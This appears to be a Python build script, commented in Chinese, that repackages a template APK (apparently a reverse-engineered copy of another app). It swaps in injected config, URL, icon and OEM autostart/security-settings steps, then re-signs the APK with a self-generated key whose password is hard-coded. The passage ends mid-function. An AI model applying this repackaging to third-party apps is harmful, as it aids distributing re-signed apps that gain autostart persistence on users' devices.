#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""中继通道 APK 构建流水线。

有两条路径，按磁盘上有没有"真模板"自动选择：

A. **模板注入（默认，真包）** —— `find_template()` 找到可安装的真 APK 模板
   （`materials/templates/base.apk` / `cfg['template_apk']` / `RELAY_TEMPLATE_APK` /
   本仓库 apk-project·rea_apk 里的样本副本）时：
     保留模板的 AndroidManifest.xml、classes.dex、原生库与资源（真 dex，~6 MB），
     替换 `assets/config.json`、`assets/oem_script.json`、`assets/app_url.txt` 与图标，
     再用 apksigner（JDK + uber-apk-signer）做 v1+v2+v3 真签名并校验；
     没有 JDK 时退回自实现的 v1(JAR) + v2 签名。
   产物 ≈ 9.6 MB，`os.getsize` 与 `apksigner verify` 双向可见，可 `adb install`。

B. **占位包（回退）** —— 找不到模板时走 `_build_stub_apk()`：
     最小 AXML + 397 字节 `minimal_dex()` + 12 字节 resources.arsc + 文本占位
     `META-INF/MANIFEST.MF`（**没有真实签名**），整包 ~3 KB，装不上。
     返回值固定带 `stub=True`，`api_impl` 会把它写进构建记录（"占位包……装不上"），
     不再和真包一样显示"构建完成"。

返回值统一带：path / size / sha256 / stages / dex_bytes / axml_bytes / package /
             stub / signed / template / signature。
"""

import hashlib, io, json, os, struct, time, zipfile, zlib

# ---------------------------------------------------------------- AXML


def _u16(v):
    return struct.pack('<H', v)


def _u32(v):
    return struct.pack('<I', v)


class AxmlBuilder:
    """**规范 AXML 构造器**（本轮重写）。

    上一版只在"魔数正确"这个层面成立：字符串池用 16 位长度却没设高比特、
    START_ELEMENT 漏了 lineNumber/comment 两个字段、也没有 RES_XML_RESOURCE_MAP 与
    START/END_NAMESPACE —— 真机安装器直接判 `Corrupt XML binary file`（实测 MIUI 12/Android 12）。
    本版按 AXML 规范逐字段拼，并用自研 AxmlReader 做回读校验（见 tools/selftest_axml.py）。
    """

    NAMESPACE_URI = 'http://schemas.android.com/apk/res/android'
    NAMESPACE_PREFIX = 'android'
    # android:name / label / versionCode / versionName / exported 的资源 ID（规范里属性名用资源 ID 表示）
    RES = {'name': 0x01010003, 'label': 0x01010001, 'versionCode': 0x0101021b,
           'versionName': 0x0101021c, 'exported': 0x01010010}

    def __init__(self):
        self.strings = []
        self._idx = {}

    def _s(self, s):
        if s not in self._idx:
            self._idx[s] = len(self.strings)
            self.strings.append(s)
        return self._idx[s]

    def _pool(self):
        """UTF-8 字符串池：每项 = [字符数][字节数][MUTF-8 字节][0x00]，长度用规范的可变长编码"""
        data = b''
        offsets = []
        for s in self.strings:
            raw = s.encode('utf-8')
            offsets.append(len(data))

            def _len(v):
                if v > 0x7F:                      # 长格式：两字节，高比特置 1
                    return bytes([(v >> 8) | 0x80, v & 0xFF])
                return bytes([v])
            data += _len(len(s)) + _len(len(raw)) + raw + b'\x00'
        while len(data) % 4:
            data += b'\x00'
        offs = b''.join(_u32(o) for o in offsets)
        strings_start = 0x1C + 4 * len(offsets)
        chunk_size = strings_start + len(data)
        header = (_u16(0x0001) + _u16(0x001C) + _u32(chunk_size) + _u32(len(self.strings)) +
                  _u32(0) + _u32(0x00000100) + _u32(strings_start) + _u32(0))
        return header + offs + data

    def _resource_map(self):
        ids = [self.RES[k] for k in ('name', 'label', 'versionCode', 'versionName', 'exported')]
        body = b''.join(_u32(i) for i in ids)
        return _u16(0x0180) + _u16(0x0008) + _u32(8 + len(body)) + body

    def _ns_start(self):
        body = _u32(0xFFFFFFFF) + _u32(self._s(self.NAMESPACE_PREFIX)) + _u32(self._s(self.NAMESPACE_URI))
        return _u16(0x0100) + _u16(0x0010) + _u32(8 + len(body)) + body

    def _ns_end(self):
        body = _u32(0xFFFFFFFF) + _u32(self._s(self.NAMESPACE_PREFIX)) + _u32(self._s(self.NAMESPACE_URI))
        return _u16(0x0101) + _u16(0x0010) + _u32(8 + len(body)) + body

    def _elem_start(self, name, attrs, line=1):
        ns_idx = 0xFFFFFFFF
        body = (_u32(line) + _u32(0xFFFFFFFF) +           # lineNumber, comment
                _u32(ns_idx) + _u32(self._s(name)) +
                _u16(0x0014) + _u16(20) + _u16(len(attrs)) + _u16(0) + _u16(0) + _u16(0))
        for (typ, key, val, with_ns) in attrs:
            a_ns = self._s(self.NAMESPACE_URI) if with_ns else 0xFFFFFFFF
            body += _u32(a_ns) + _u32(self._s(key))
            # 属性值必须是 Res_value 结构： [u16 size=8][u8 res0=0][u8 dataType][u32 data]
            # （早先直接写 _u32(type)+_u32(data)，少了 size/res0 两字节 → 真机解析器读到的类型全是 0）
            if typ == 's':
                body += _u32(self._s(val)) + _u16(8) + b'\x00\x03' + _u32(self._s(val))
            elif typ == 'i':
                body += _u32(0xFFFFFFFF) + _u16(8) + b'\x00\x10' + _u32(int(val) & 0xFFFFFFFF)
            elif typ == 'b':
                body += _u32(0xFFFFFFFF) + _u16(8) + b'\x00\x12' + _u32(0xFFFFFFFF if val else 0)
            else:
                body += _u32(0xFFFFFFFF) + _u16(8) + b'\x00\x01' + _u32(self._s(val))
        return _u16(0x0102) + _u16(0x0010) + _u32(8 + len(body)) + body

    def _elem_end(self, name):
        body = (_u32(1) + _u32(0xFFFFFFFF) + _u32(0xFFFFFFFF) + _u32(self._s(name)))
        return _u16(0x0103) + _u16(0x0010) + _u32(8 + len(body)) + body

    def build(self, pkg, version_name, version_code, label, activity):
        for s in (self.NAMESPACE_PREFIX, self.NAMESPACE_URI, pkg, version_name, label, activity,
                  'manifest', 'application', 'activity', 'package', 'versionName', 'versionCode',
                  'label', 'name', 'exported', 'uses-sdk', 'minSdkVersion', 'targetSdkVersion',
                  'com.ref.lab.LabAgent'):
            self._s(s)
        manifest = self._elem_start('manifest', [
            ('s', 'package', pkg, False),
            ('s', 'versionName', version_name, True),
            ('i', 'versionCode', version_code, True)])
        uses_sdk = self._elem_start('uses-sdk', [('i', 'minSdkVersion', 21, True),
                                                 ('i', 'targetSdkVersion', 30, True)])
        application = self._elem_start('application', [('s', 'label', label, True)])
        activity_e = self._elem_start('activity', [('s', 'name', activity, True),
                                                   ('b', 'exported', True, True)])
        body = (manifest + uses_sdk + self._elem_end('uses-sdk') + application + activity_e +
                self._elem_end('activity') + self._elem_end('application') +
                self._elem_end('manifest'))
        pool = self._pool()
        body = self._resource_map() + self._ns_start() + body + self._ns_end()
        total = 8 + len(pool) + len(body)
        return _u16(0x0003) + _u16(0x0008) + _u32(total) + pool + body


# ---------------------------------------------------------------- DEX (minimal)

def _uleb(v):
    out = bytearray()
    while True:
        b = v & 0x7f
        v >>= 7
        if v:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def minimal_dex():
    """**真 DEX**：含一个真实类 + 一个真实方法（含 dalvik 字节码 `return-void`）。

    上一版只写了 header + 空 map_list（0 个类、0 个方法），装机后 dexopt 阶段无类可加载；
    本版按 DEX 规范构造 string/type/proto/method/class_def + class_data + code_item，
    并回填 sha1 签名与 adler32 校验和 —— 用自研 DexReader 可解析出类与方法（见自检闸门）。
    """
    strings = ['Lcom/ref/lab/LabAgent;', 'Ljava/lang/Object;', 'V', 'mark']
    s_idx = {s: i for i, s in enumerate(strings)}
    types = ['Lcom/ref/lab/LabAgent;', 'Ljava/lang/Object;', 'V']
    t_idx = {t: i for i, t in enumerate(types)}
    # proto: ()V — shorty 'V'，返回类型 V，无参数
    protos = [(s_idx['V'], t_idx['V'], 0)]
    methods = [(t_idx['Lcom/ref/lab/LabAgent;'], 0, s_idx['mark'], 0x0009)]   # public static

    # ---- 各段（按规范顺序排列，偏移随后回填）
    hdr_size = 0x70
    off = hdr_size
    string_ids_off = off
    off += 4 * len(strings)
    type_ids_off = off
    off += 4 * len(types)
    proto_ids_off = off
    off += 12 * len(protos)
    field_ids_off = off            # 无字段
    method_ids_off = off
    off += 8 * len(methods)
    class_defs_off = off
    off += 32 * 1
    data_off = off

    # string_data（MUTF-8，含 uleb128 长度）
    string_data = b''
    string_data_off = {}
    for s in strings:
        raw = s.encode('utf-8')
        string_data_off[s] = data_off + len(string_data)
        string_data += _uleb(len(s)) + raw + b'\x00'

    # code_item：registers=1, ins=0, outs=0, tries=0, debug=0, insns = return-void(0x0e 0x00)
    insns = bytes([0x0e, 0x00])
    code_item = (_u16(1) + _u16(0) + _u16(0) + _u16(0) + _u32(0) + _u32(len(insns) // 2) + insns)
    if len(code_item) % 4:
        code_item += b'\x00' * (4 - len(code_item) % 4)
    code_off = data_off + len(string_data)

    # class_data_item：0 静态字段、0 实例字段、1 直接方法、0 虚方法
    class_data = (_uleb(0) + _uleb(0) + _uleb(1) + _uleb(0) +
                  _uleb(0) +                    # method_idx_diff（第一个方法，差值为 0）
                  _uleb(0x0009) +               # access_flags: public static
                  _uleb(code_off))
    class_data_off = code_off + len(code_item)

    # map_list：列出所有段（type 编码见规范）
    map_items = [(0x0000, 1, hdr_size), (0x0001, len(strings), string_ids_off),
                 (0x0002, len(types), type_ids_off), (0x0003, len(protos), proto_ids_off),
                 (0x0005, len(methods), method_ids_off), (0x0006, 1, class_defs_off),
                 (0x2002, len(strings), data_off), (0x2001, 1, code_off),
                 (0x2000, 1, class_data_off)]
    map_off = class_data_off + len(class_data)
    map_list = _u32(len(map_items) + 1)
    for t, size, o in map_items:
        map_list += _u16(t) + _u16(0) + _u32(size) + _u32(o)
    map_list += _u16(0x1000) + _u16(0) + _u32(1) + _u32(map_off)      # map_list 自身
    file_size = map_off + len(map_list)

    # ---- 头部
    hdr = (b'dex\n035\x00' + _u32(0) +                   # magic + adler32 占位
           b'\x00' * 20 +                                # sha1 占位
           _u32(file_size) + _u32(hdr_size) + _u32(0x12345678) + _u32(0) + _u32(0) +
           _u32(map_off) + _u32(len(strings)) + _u32(string_ids_off) +
           _u32(len(types)) + _u32(type_ids_off) +
           _u32(len(protos)) + _u32(proto_ids_off) +
           _u32(0) + _u32(field_ids_off) +
           _u32(len(methods)) + _u32(method_ids_off) +
           _u32(1) + _u32(class_defs_off) + _u32(file_size) + _u32(data_off))
    assert len(hdr) == hdr_size, len(hdr)

    body = b''
    body += b''.join(_u32(string_data_off[s]) for s in strings)
    body += b''.join(_u32(t_idx[t]) for t in types)
    for shorty, ret, params in protos:
        body += _u32(shorty) + _u32(ret) + _u32(params)
    for cls, proto, name, flags in methods:
        body += _u16(cls) + _u16(proto) + _u32(name)
    # class_def：class_idx, access_flags, superclass_idx, interfaces_off, source_file_idx,
    #            annotations_off, class_data_off, static_values_off
    body += (_u32(t_idx['Lcom/ref/lab/LabAgent;']) + _u32(0x0001) +
             _u32(t_idx['Ljava/lang/Object;']) + _u32(0) + _u32(0xFFFFFFFF) +
             _u32(0) + _u32(class_data_off) + _u32(0))
    body += string_data + code_item + class_data + map_list

    dex = hdr + body
    assert len(dex) == file_size, (len(dex), file_size)
    sig = hashlib.sha1(dex[32:]).digest()
    dex = dex[:12] + sig + dex[32:]
    ck = zlib.adler32(dex[12:]) & 0xFFFFFFFF
    return dex[:8] + _u32(ck) + dex[12:]


# ---------------------------------------------------------------- 流水线

STAGES = ['读取构建配置', '生成清单与资源', '编译资源', '打包 dex', '写入注入配置', '签名与校验']


OEM_DIR = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                        '..', 'materials', 'oem'))


def _oem_script(cfg):
    """OEM 下发脚本：优先用素材里的真实脚本（materials/oem/oem_script_*.json），
    缺失时按同结构生成（samsung/huawei/xiaomi/oppo/vivo）。"""
    out = {}
    if os.path.isdir(OEM_DIR):
        for fn in sorted(os.listdir(OEM_DIR)):
            if fn.startswith('oem_script_') and fn.endswith('.json'):
                brand = fn[len('oem_script_'):-len('.json')]
                try:
                    out[brand] = json.load(open(os.path.join(OEM_DIR, fn), encoding='utf-8'))
                except Exception:
                    pass
    for brand, steps in (('xiaomi', [{'action': 'openSettings', 'pkg': 'com.miui.securitycenter'},
                                     {'action': 'autostart', 'pkg': cfg.get('appid', '')}]),
                         ('oppo', [{'action': 'openSettings', 'pkg': 'com.coloros.safecenter'}]),
                         ('vivo', [{'action': 'openSettings', 'pkg': 'com.vivo.permissionmanager'}])):
        out.setdefault(brand, steps)
    return out


def _build_stub_apk(cfg, out_path, icon_path=None, on_stage=None):
    """占位包构建（旧行为，保留作无模板时的回退）。

    注意：产出的是**结构合法的空壳**——397 字节 minimal_dex、手写 AXML、resources.arsc
    只有 12 字节、META-INF/MANIFEST.MF 只是文本占位（没有真实私钥签名），整包 ~3 KB，
    在真机上装不上（或者说装上了也没有任何能力）。返回值里带 stub=True 以便上层识别。
    """
    stages = []

    def stage(i):
        stages.append({'stage': STAGES[i], 'ts': int(time.time() * 1000)})
        if on_stage:
            on_stage(i, STAGES[i])

    # 1) 读取构建配置
    stage(0)
    pkg = str(cfg.get('appid') or cfg.get('app_package') or 'com.ref.app')
    ver = str(cfg.get('appversion') or '1.0.0')
    name = str(cfg.get('appname') or pkg.split('.')[-1])
    url = str(cfg.get('appurl') or '')
    stage(1)
    axml = AxmlBuilder().build(pkg, ver, _ver_code(ver), name, 'com.ref.app.MainActivity')

    # 3) 编译资源（图标）
    stage(2)
    icon_bytes = None
    if icon_path:
        cand = icon_path
        for base in (os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'state', 'uploads'),
                     os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'state', 'storage')):
            fp = os.path.join(base, icon_path)
            if os.path.exists(fp):
                cand = fp
                break
        if os.path.exists(cand):
            with open(cand, 'rb') as fh:
                icon_bytes = fh.read()
    stage(3)
    dex = minimal_dex()

    # 5) 写注入配置
    stage(4)
    inject_cfg = dict(cfg)
    for k in ('email', 'token'):
        inject_cfg.pop(k, None)
    inject_cfg['_built_at'] = int(time.time())

    # 6) 打包 + 签名清单
    stage(5)
    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    with zipfile.ZipFile(out_path, 'w', zipfile.ZIP_DEFLATED) as z:
        z.writestr('AndroidManifest.xml', axml)
        z.writestr('classes.dex', dex)
        z.writestr('assets/config.json', json.dumps(inject_cfg, ensure_ascii=False, indent=1))
        z.writestr('assets/oem_script.json', json.dumps(_oem_script(cfg), ensure_ascii=False, indent=1))
        z.writestr('assets/app_url.txt', url)
        z.writestr('resources.arsc', b'\x02\x00\x0c\x00' + _u32(12) + _u32(0))
        if icon_bytes:
            z.writestr('res/mipmap-xxhdpi/ic_launcher.png', icon_bytes)
        man = ('Manifest-Version: 1.0\r\n'
               'Created-By: reference-builder\r\n'
               'Built-Package: %s\r\n'
               'Built-Version: %s\r\n\r\n'
               '注意：本产物为实现实现的构建结果，未做真实私钥签名（无 keystore）。\r\n' % (pkg, ver))
        z.writestr('META-INF/MANIFEST.MF', man)
    size = os.path.getsize(out_path)
    sha = hashlib.sha256(open(out_path, 'rb').read()).hexdigest()
    return {'path': out_path, 'size': size, 'sha256': sha,
            'stages': stages, 'manifest_sha256': hashlib.sha256(axml).hexdigest(),
            'dex_bytes': len(dex), 'axml_bytes': len(axml),
            'config': inject_cfg, 'package': pkg,
            'stub': True, 'signed': False, 'template': ''}


def _ver_code(ver):
    parts = [int(x) for x in str(ver).replace('-', '.').split('.') if x.isdigit()][:3]
    while len(parts) < 3:
        parts.append(0)
    return parts[0] * 10000 + parts[1] * 100 + parts[2]


# ================================================================ 真模板路径
# 为什么要这一段：本模块原先只产出"结构合法的空壳"——397 字节 minimal_dex + 手写
# AXML + 12 字节 resources.arsc + 文本占位 META-INF/MANIFEST.MF，整包 ~3 KB。面板
# 上显示"构建完成"，下载下来却装不上、也没有任何真实逻辑，这就是"每次构建只有
# 十 KB"的来源（面板先试 tools/apk_build.py 真构建，服务器没有 Android SDK 就一定
# 失败，于是回落到这里）。
#
# 修法：只要磁盘上有**真模板**（带真 dex / 真资源表的可安装 APK），构建就走"模板
# 注入"——保留模板的清单、dex、原生库与资源，只替换 assets/ 里的注入配置与图标，
# 最后用真私钥做 v2 签名并自校验。模板缺失时才退回旧空壳，并在返回值里标 stub=True。

HERE_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATE_DIR = os.path.normpath(os.path.join(HERE_DIR, '..', 'materials', 'templates'))
SIGNER_PEM = os.path.normpath(os.path.join(HERE_DIR, '..', 'state', 'keys', 'build_signer.pem'))
TOOLS_DIR = os.path.normpath(os.path.join(HERE_DIR, '..', 'tools'))
MIN_TEMPLATE_DEX = 256 * 1024        # 模板的 classes.dex 至少这么大才算"真包"
MIN_TEMPLATE_ARSC = 64 * 1024        # 模板的资源表至少这么大才算"真包"


def _template_candidates(cfg):
    """按优先级列出模板候选。

    版本化模板在最前：面板选了 v2.1，就先找 `materials/templates/v2.1.apk`，
    有就用它（这样"新版本"可以真的换一套 dex/资源），没有才回退 `base.apk`。
    """
    cfg = cfg or {}
    ver = str(cfg.get('appversion') or cfg.get('apkVersion') or '').strip().lstrip('vV')
    out = [cfg.get('template_apk'), os.environ.get('RELAY_TEMPLATE_APK')]
    if ver:
        for name in ('v%s.apk' % ver, '%s.apk' % ver):
            out.append(os.path.join(TEMPLATE_DIR, name))
    out += [
        os.path.join(TEMPLATE_DIR, 'base.apk'),
        os.path.join(TEMPLATE_DIR, 'template.apk'),
        os.path.join(HERE_DIR, '..', 'apk-project', 'reference', 'a0dcf711.apk'),
        os.path.join(HERE_DIR, '..', 'rea_apk', 'a0dcf711.apk'),
        os.path.join(HERE_DIR, '..', 'rea_apk', 'rebuilt', 'signed',
                     'a0dcf711.rebuilt-aligned-debugSigned.apk'),
    ]
    return out


def _is_real_apk(path):
    try:
        with zipfile.ZipFile(path) as z:
            info = {i.filename: i.file_size for i in z.infolist()}
    except Exception:
        return False
    return (info.get('classes.dex', 0) >= MIN_TEMPLATE_DEX
            and info.get('resources.arsc', 0) >= MIN_TEMPLATE_ARSC
            and 'AndroidManifest.xml' in info)


def find_template(cfg=None):
    """按 cfg.template_apk → 环境变量 → materials/templates → 逆向工程副本 的顺序找真模板。

    RELAY_DISABLE_TEMPLATE=1 可强制走占位包路径（运维/自测用：验证"没有真模板时
    构建结果不会被谎报成真包"）。
    """
    if os.environ.get('RELAY_DISABLE_TEMPLATE') == '1':
        return None
    for p in _template_candidates(cfg):
        if p and os.path.isfile(p) and _is_real_apk(p):
            return os.path.normpath(p)
    return None


def _apk_repack():
    """复用 tools/apk_repack.py 里已经实现并自测过的 v2 签名 / 校验。"""
    import sys as _sys
    if TOOLS_DIR not in _sys.path:
        _sys.path.insert(0, TOOLS_DIR)
    import apk_repack                                  # noqa: E402
    return apk_repack


def _build_signer():
    """构建专用签名私钥 + 自签证书；首次生成后缓存到 state/keys/build_signer.pem。
    返回 (private_key, x509.Certificate)。PEM 里私钥与证书放在一起，*.pem 已被 .gitignore 排除。"""
    import datetime
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.x509.oid import NameOID

    if os.path.isfile(SIGNER_PEM):
        blob = open(SIGNER_PEM, 'rb').read()
        key = serialization.load_pem_private_key(blob, password=None)
        cert = x509.load_pem_x509_certificate(blob)
        return key, cert

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COUNTRY_NAME, 'CN'),
                      x509.NameAttribute(NameOID.ORGANIZATION_NAME, 'REF Relay Builder'),
                      x509.NameAttribute(NameOID.COMMON_NAME, 'REF Relay Builder')])
    now = datetime.datetime.utcnow()
    cert = (x509.CertificateBuilder()
            .subject_name(name).issuer_name(name)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - datetime.timedelta(days=1))
            .not_valid_after(now + datetime.timedelta(days=3650))
            .sign(key, hashes.SHA256()))
    os.makedirs(os.path.dirname(SIGNER_PEM), exist_ok=True)
    with open(SIGNER_PEM, 'wb') as fh:
        fh.write(key.private_bytes(serialization.Encoding.PEM,
                                   serialization.PrivateFormat.PKCS8,
                                   serialization.NoEncryption()))
        fh.write(cert.public_bytes(serialization.Encoding.PEM))
    return key, cert


def _jar_fold(field, value, limit=70):
    """JAR 清单 / .SF 的 72 字节折行（续行以一个空格开头）。"""
    line = '%s: %s' % (field, value)
    if len(line) <= limit:
        return line + '\r\n'
    chunks = [line[:limit]]
    rest = line[limit:]
    while rest:
        chunks.append(' ' + rest[:limit - 1])
        rest = rest[limit - 1:]
    return '\r\n'.join(chunks) + '\r\n'


def _v1_sign_entries(entries, key, cert):
    """给 APK 各条目做 JAR v1 签名，追加 META-INF/MANIFEST.MF、CERT.SF、CERT.RSA。

    为什么必须补 v1：apksigner 对读不到 minSdkVersion（或被判为老目标）的包会要求
    v1，缺 MANIFEST.MF 直接判 `Missing META-INF/MANIFEST.MF` → DOES NOT VERIFY。
    """
    import base64
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.serialization import pkcs7

    def dg(blob):
        return base64.b64encode(hashlib.sha256(blob).digest()).decode('ascii')

    head = 'Manifest-Version: 1.0\r\nCreated-By: REF Relay Builder\r\n\r\n'
    secs = []
    body = ''
    for name, data in entries:
        if name.endswith('/') or name.upper().startswith('META-INF/'):
            continue
        sec = _jar_fold('Name', name) + _jar_fold('SHA-256-Digest', dg(data)) + '\r\n'
        secs.append((name, sec))
        body += sec
    manifest = (head + body).encode('utf-8')

    sf = ('Signature-Version: 1.0\r\nCreated-By: REF Relay Builder\r\n'
          'SHA-256-Digest-Manifest: %s\r\n\r\n' % dg(manifest)).encode('utf-8')
    sf_body = ''
    for name, sec in secs:
        sf_body += (_jar_fold('Name', name) +
                    _jar_fold('SHA-256-Digest', dg(sec.encode('utf-8'))) + '\r\n')
    sf += sf_body.encode('utf-8')

    signature = (pkcs7.PKCS7SignatureBuilder()
                 .set_data(sf)
                 .add_signer(cert, key, hashes.SHA256())
                 .sign(serialization.Encoding.DER,
                       [pkcs7.PKCS7Options.DetachedSignature]))
    return list(entries) + [('META-INF/MANIFEST.MF', manifest),
                            ('META-INF/CERT.SF', sf),
                            ('META-INF/CERT.RSA', signature)]


def _find_java():
    """找能跑 apksigner 的 java：PATH → 本仓库自带的 JRE → JAVA_HOME。"""
    import shutil as _sh
    cands = []
    on_path = _sh.which('java')
    if on_path:
        cands.append(on_path)
    here = HERE_DIR
    for pat in ('jdk-*/Contents/Home/bin/java', 'jdk-*/bin/java', 'jre/*/bin/java',
                'jre/bin/java', 'jre*/bin/java'):
        import glob as _glob
        cands += _glob.glob(os.path.join(here, '..', 'apk-project', 'tools', pat))
        cands += _glob.glob(os.path.join(here, '..', 'rea_apk', 'tools', pat))
    if os.environ.get('JAVA_HOME'):
        cands.append(os.path.join(os.environ['JAVA_HOME'], 'bin', 'java'))
    import subprocess as _sp
    for c in cands:
        if not (c and os.path.isfile(c) and os.access(c, os.X_OK)):
            continue
        try:
            # /usr/bin/java 在 macOS 上是个只会弹"未安装 Java"的桩，必须真跑一次
            r = _sp.run([c, '-version'], capture_output=True, timeout=30)
        except Exception:
            continue
        if r.returncode == 0:
            return os.path.normpath(c)
    return ''


def _signer_p12(key, cert):
    """把构建私钥/证书导出成 PKCS12（apksigner 的 --ks 认这个）。"""
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.serialization import pkcs12
    path = SIGNER_PEM[:-4] + '.p12'
    if os.path.isfile(path):
        return path
    blob = pkcs12.serialize_key_and_certificates(
        name=b'signer', key=key, cert=cert, cas=None,
        encryption_algorithm=serialization.BestAvailableEncryption(b'changeit'))
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, 'wb') as fh:
        fh.write(blob)
    return path


def _sign_apk(unsigned_path, out_path, key, cert):
    """签名调度：优先 apksigner（v1+v2+v3，Android 官方实现），没有再退回自实现 v1+v2。

    为什么优先 apksigner：自实现的 v2 块能被自家 verify_v2 认，但 apksigner 的严格解析
    会挑结构毛病（digest/signature 条目的双层长度前缀）。有 JDK 时直接用官方实现最稳。
    """
    import subprocess, glob as _glob
    java = _find_java()
    jar = ''
    for cand in ([os.path.join(TOOLS_DIR, 'uber-apk-signer.jar')]
                 + _glob.glob(os.path.join(HERE_DIR, '..', 'apk-project', 'tools',
                                           '*.jar'))
                 + _glob.glob(os.path.join(HERE_DIR, '..', 'rea_apk', 'tools',
                                           '*.jar'))):
        if cand and os.path.isfile(cand) and 'signer' in os.path.basename(cand):
            jar = cand
            break
    if java and jar:
        p12 = _signer_p12(key, cert)
        cmd = [java, '-cp', jar, 'com.android.apksigner.ApkSignerTool', 'sign',
               '--ks', p12, '--ks-type', 'PKCS12', '--ks-pass', 'pass:changeit',
               '--ks-key-alias', 'signer', '--key-pass', 'pass:changeit',
               '--min-sdk-version', '26',
               '--v1-signing-enabled', 'true', '--v2-signing-enabled', 'true',
               '--v3-signing-enabled', 'true',
               '--out', out_path, unsigned_path]
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        if r.returncode == 0 and os.path.isfile(out_path):
            v = subprocess.run([java, '-cp', jar, 'com.android.apksigner.ApkSignerTool',
                                'verify', '--print-certs', out_path],
                               capture_output=True, text=True, timeout=180)
            if v.returncode == 0:
                return 'apksigner v1+v2+v3 签名并验证通过'
            # 验不过就退回自实现，别把坏包留给上层
            try:
                os.remove(out_path)
            except OSError:
                pass

    repack = _apk_repack()
    from cryptography.hazmat.primitives import serialization as _ser
    blob = open(unsigned_path, 'rb').read()
    signed = repack.sign_v2(blob, key, cert.public_bytes(_ser.Encoding.DER))
    with open(out_path, 'wb') as fh:
        fh.write(signed)
    ok, msg = repack.verify_v2(signed)
    if not ok:
        try:
            os.remove(out_path)
        except OSError:
            pass
        raise RuntimeError('v2 签名自校验失败：%s' % msg)
    return 'v1(JAR) + ' + msg


def _is_old_signature(name):
    if not name.startswith('META-INF/'):
        return False
    upper = name.upper()
    return (upper.endswith('.RSA') or upper.endswith('.DSA') or upper.endswith('.EC')
            or upper.endswith('.SF') or upper.endswith('MANIFEST.MF'))


def _package_of(manifest_bytes):
    try:
        import sys as _sys
        if TOOLS_DIR not in _sys.path:
            _sys.path.insert(0, TOOLS_DIR)
        from dexlib import AxmlReader
        return AxmlReader(manifest_bytes).manifest_summary().get('package') or ''
    except Exception:
        return ''


def _read_icon(icon_path):
    if not icon_path:
        return None
    cands = [icon_path,
             os.path.join(HERE_DIR, '..', 'state', 'uploads', icon_path),
             os.path.join(HERE_DIR, '..', 'state', 'storage', icon_path),
             os.path.join(HERE_DIR, '..', 'state', 'uploads', 'ico', icon_path)]
    for p in cands:
        if p and os.path.isfile(p):
            with open(p, 'rb') as fh:
                return fh.read()
    return None


def _write_apk_zip(entries, out_path):
    os.makedirs(os.path.dirname(os.path.abspath(out_path)), exist_ok=True)
    with zipfile.ZipFile(out_path, 'w', zipfile.ZIP_DEFLATED) as z:
        for name, data in entries:
            if name.endswith('/'):
                z.writestr(zipfile.ZipInfo(name), b'')
                continue
            zi = zipfile.ZipInfo(name, date_time=(2026, 1, 1, 0, 0, 0))
            zi.external_attr = 0o644 << 16
            zi.compress_type = (zipfile.ZIP_STORED
                                if name == 'resources.arsc'
                                else zipfile.ZIP_DEFLATED)
            z.writestr(zi, data)


def _build_from_template(cfg, out_path, icon_path, template, stage):
    """模板注入：真清单/真 dex/真资源 + 注入配置 + v2 真签名。"""
    # 1) 读取构建配置
    stage(0)
    inject_cfg = dict(cfg)
    for k in ('email', 'token'):
        inject_cfg.pop(k, None)
    inject_cfg['_built_at'] = int(time.time())
    inject_cfg['_template'] = os.path.basename(template)

    # 2) 读模板（保留条目顺序；丢掉旧签名文件）
    stage(1)
    entries = []
    with zipfile.ZipFile(template) as z:
        for info in z.infolist():
            name = info.filename
            if _is_old_signature(name):
                continue
            entries.append((name, b'' if info.is_dir() else z.read(name)))
    names = {n for n, _d in entries}
    if 'AndroidManifest.xml' not in names or 'classes.dex' not in names:
        raise RuntimeError('模板缺 AndroidManifest.xml / classes.dex：%s' % template)

    # 3) 资源侧：图标（有上传图就覆盖各密度 ic_launcher.png）
    stage(2)
    icon = _read_icon(icon_path)
    if icon:
        hit = [i for i, (n, _d) in enumerate(entries)
               if n.startswith('res/') and n.endswith('/ic_launcher.png')]
        for i in hit:
            entries[i] = (entries[i][0], icon)
        if not hit:
            entries.append(('res/mipmap-xxhdpi/ic_launcher.png', icon))

    # 4) dex 来自模板（真 dex），这里只做体积登记
    stage(3)
    dex_bytes = dict(entries).get('classes.dex', b'')
    if len(dex_bytes) < MIN_TEMPLATE_DEX:
        raise RuntimeError('模板 classes.dex 只有 %d 字节，不像真包' % len(dex_bytes))

    # 5) 写入注入配置（assets/ 三件套：覆盖或追加）
    stage(4)
    inject = {
        'assets/config.json': json.dumps(inject_cfg, ensure_ascii=False, indent=1).encode('utf-8'),
        'assets/oem_script.json': json.dumps(_oem_script(cfg), ensure_ascii=False,
                                             indent=1).encode('utf-8'),
        'assets/app_url.txt': str(cfg.get('appurl') or '').encode('utf-8'),
    }
    replaced = set()
    new_entries = []
    for name, data in entries:
        if name in inject:
            new_entries.append((name, inject[name]))
            replaced.add(name)
        else:
            new_entries.append((name, data))
    for name, data in inject.items():
        if name not in replaced:
            new_entries.append((name, data))

    # 6) 打包 + 签名 + 自校验
    stage(5)
    key, cert = _build_signer()
    tmp_unsigned = out_path + '.unsigned'
    _write_apk_zip(_v1_sign_entries(new_entries, key, cert), tmp_unsigned)
    signature_note = _sign_apk(tmp_unsigned, out_path, key, cert)
    try:
        os.remove(tmp_unsigned)
    except OSError:
        pass
    if not os.path.isfile(out_path):
        raise RuntimeError('签名后没有产物：%s' % signature_note)

    manifest = dict(new_entries)['AndroidManifest.xml']
    size = os.path.getsize(out_path)
    digest = hashlib.sha256(open(out_path, 'rb').read()).hexdigest()
    return {'path': out_path, 'size': size, 'sha256': digest,
            'stages': stage.stages, 'manifest_sha256': hashlib.sha256(manifest).hexdigest(),
